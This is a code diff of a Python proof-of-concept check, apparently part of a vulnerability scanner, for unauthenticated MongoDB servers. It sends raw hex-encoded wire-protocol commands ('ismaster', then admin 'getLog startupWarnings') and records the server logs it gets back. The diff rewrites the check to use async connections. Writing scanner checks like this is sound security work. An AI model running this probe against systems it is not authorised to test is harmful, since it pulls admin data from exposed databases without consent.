@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 # @author = 'orleven'
 
-import socket
+from lib.utils.connect import open_connection
 from script import Script, SERVICE_PORT_MAP
 
 class POC(Script):
@@ -15,22 +15,18 @@ class POC(Script):
         self.level = 'high'
         Script.__init__(self, target=target, service_type=self.service_type)
 
-    def prove(self):
-        try:
-            socket.setdefaulttimeout(5)
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((self.target_host, self.target_port))
-            data = bytes.fromhex(
-                "3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000")
-            s.send(data)
-            result = s.recv(1024)
-            if "ismaster" in result:
-                getlog_data = bytes.fromhex(
-                    "480000000200000000000000d40700000000000061646d696e2e24636d6400000000000100000021000000026765744c6f670010000000737461727475705761726e696e67730000")
-                s.send(getlog_data)
-                info = s.recv(1024)
-                if "totalLinesWritten" in result:
-                    self.flag = 1
-                    self.res.append({"info": info[:100], "key": "mongodb_unauth", "mongodb_info": info})
-        except Exception as e:
-            pass
+    async def prove(self):
+        reader, writer = await open_connection(self.target_host, self.target_port)
+        data = bytes.fromhex(
+            "3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000")
+        writer.write(data)
+        result = await reader.read(1024)
+        if "ismaster" in str(result):
+            getlog_data = bytes.fromhex(
+                "480000000200000000000000d40700000000000061646d696e2e24636d6400000000000100000021000000026765744c6f670010000000737461727475705761726e696e67730000")
+            writer.write(getlog_data)
+            result1 = await reader.read(1024)
+            if "totalLinesWritten" in str(result1):
+                self.flag = 1
+                self.res.append({"info": result1[:100], "key": "mongodb_unauth", "mongodb_info": result1})
+        writer.close()
